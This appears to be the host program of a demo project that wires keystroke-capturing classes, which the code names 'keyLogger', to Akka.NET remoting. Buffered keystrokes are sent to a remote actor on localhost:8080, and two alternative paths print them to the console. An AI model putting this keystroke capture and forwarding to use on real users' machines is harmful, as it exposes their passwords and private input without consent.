using Akka.Actor;
using Akka.Configuration;
using KeyWatcher.Actors.Messages;
using System;
using System.Windows.Forms;

namespace KeyWatcher.Host
{
	class Program
	{
		static void Main(string[] args)
		{
			//Program.UseSimpleKeyWatcher();
			//Program.UseBufferedKeyWatcher();
			Program.UseAkka();
		}

		private static void UseBufferedKeyWatcher()
		{
			using (var keyLogger = new BufferedKeyWatcher(10))
			{
				keyLogger.KeysLogged += (s, e) => Console.WriteLine(e.Keys);
				Application.Run();
			}
		}

		private static void UseSimpleKeyWatcher()
		{
			using (var keyLogger = new EventedKeyWatcher())
			{
				keyLogger.KeyLogged += (s, e) => Console.Write(e.Key);
				Application.Run();
			}
		}

		private static void UseAkka()
		{
			var config = ConfigurationFactory.ParseString(@"
akka {
    actor {
        provider = ""Akka.Remote.RemoteActorRefProvider, Akka.Remote""
    }
    remote {
        helios.tcp {
            port = 8090
            hostname = localhost
        }
    }
}
");

			using (var system = ActorSystem.Create("MyClient", config))
			{
				//get a reference to the remote actor
				var user = system
					 .ActorSelection("akka.tcp://UserSystem@localhost:8080/user/user");

				using (var keyLogger = new BufferedKeyWatcher(10))
				{
					keyLogger.KeysLogged += (s, e) =>
					{
						//send a message to the remote actor
						user.Tell(new UserKeys("me", e.Keys));
					};

					Application.Run();
				}
			}
		}
	}
}
